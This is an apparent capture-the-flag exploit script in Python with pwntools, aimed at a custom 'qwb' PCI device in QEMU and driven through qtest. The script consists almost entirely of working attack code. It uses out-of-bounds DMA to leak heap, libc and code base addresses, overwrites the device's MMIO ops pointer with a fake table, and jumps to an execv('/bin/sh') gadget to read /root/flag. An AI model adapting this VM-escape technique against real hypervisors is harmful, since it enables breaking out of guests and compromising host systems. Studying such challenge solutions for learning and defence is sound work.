#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 1
if local:
    p = process('./qemu-system-x86_64 -display none -machine accel=qtest -m 512M -device qwb -nodefaults -monitor none -qtest stdio'.split())
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

MMIO_ADDR = 0x23300000

def init_pci():
    sl('outl {} {}'.format(0xcf8, 0x80001010))
    sl('outl {} {}'.format(0xcfc, MMIO_ADDR))
    sl('outl {} {}'.format(0xcf8, 0x80001004))
    sl('outw {} {}'.format(0xcfc, 0x107))

# size of dma_info array
def set_size(sz):
    sl('writeq {} {}'.format(MMIO_ADDR, sz))
    ru('OK')

def set_idx(idx):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x8, idx))
    ru('OK')

def set_src(src):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x10, src))
    ru('OK')

def set_dst(dst):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x18, dst))
    ru('OK')

def set_cnt(cnt):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x20, cnt))
    ru('OK')

def set_cmd(cmd):
    sl('writeq {} {}'.format(MMIO_ADDR + 0x28, cmd))
    ru('OK')

def do_dma(): # mmio_read(0x30)
    sl('readq {}'.format(MMIO_ADDR + 0x30))
    ru('OK ')
    ru('OK ')

def dma_read(idx, buf, buf_idx, cnt):
    set_idx(idx)
    set_src(buf)
    set_dst(buf_idx)
    set_cnt(cnt)
    set_cmd(0)

def dma_write(idx, buf_idx, buf, cnt):
    set_idx(idx)
    set_src(buf_idx)
    set_dst(buf)
    set_cnt(cnt)
    set_cmd(1)

def readb64(addr, sz):
    sl('b64read {} {}'.format(addr, sz))
    ru('OK ')
    content = ru('\n')
    ru('OK ')
    return b64d(content)

def writeb64(addr, val):
    encoded = b64e(val)
    sl('b64write {} {} {}'.format(addr, len(val), encoded))
    ru('OK')

MAX_ADDR = 1 << 64
PHY_USERBUF = 0x40000

# init pci device
init_pci()

# leak address
set_size(0x20)
dma_write(0, MAX_ADDR - 0xf00, PHY_USERBUF, 0x1000) # leak satrt from &dma_buf-0xf00
do_dma()
heap_base = u64(readb64(PHY_USERBUF, 0x8)) - 0xe35d50
info('heap_base = ' + hex(heap_base))
libc_base = u64(readb64(PHY_USERBUF + 0x28, 0x8)) - 0x43072
info('libc_base = ' + hex(libc_base))
code_base = u64(readb64(PHY_USERBUF + 0x108, 0x8)) - 0x2d4ec0
info('code_base = ' + hex(code_base))
system_plt = code_base + 0x2d6be4
info('system_plt = ' + hex(system_plt))
state_addr = heap_base + 0xf561e0
writeb64(PHY_USERBUF + 0xf00, p64(system_plt) + p64(system_plt))
fake_ops = state_addr + 0xe00
info('fake_ops = ' + hex(fake_ops))

# overwrite ptr
'''
(gdb) x/2i 0x3d2f05+0x00555555554000
   0x555555926f05 <net_bridge_run_helper+848>:  lea    rdi,[rip+0x6bc2ab]        # 0x555555fe31b7
   0x555555926f0c <net_bridge_run_helper+855>:  call   0x55555582a290 <execv@plt>
(gdb) x/s 0x555555fe31b7
0x555555fe31b7: "/bin/sh"
'''
gadget = code_base + 0x3d2f0c # lea rdi, &"/bin/sh"; call execv
'''
(gdb) p/x &((QWBState *)0)->mmio->ops
$1 = 0x948
'''
cmd = b'cat /root/flag'
writeb64(PHY_USERBUF + 0x100, cmd)
writeb64(PHY_USERBUF + 0x100 + 0x948, p64(fake_ops))
dma_read(0, PHY_USERBUF, MAX_ADDR - 0xf00, 0x1000)
do_dma()

#input('@')
# control pc
sl('writeq {} 1'.format(MMIO_ADDR))

p.interactive()

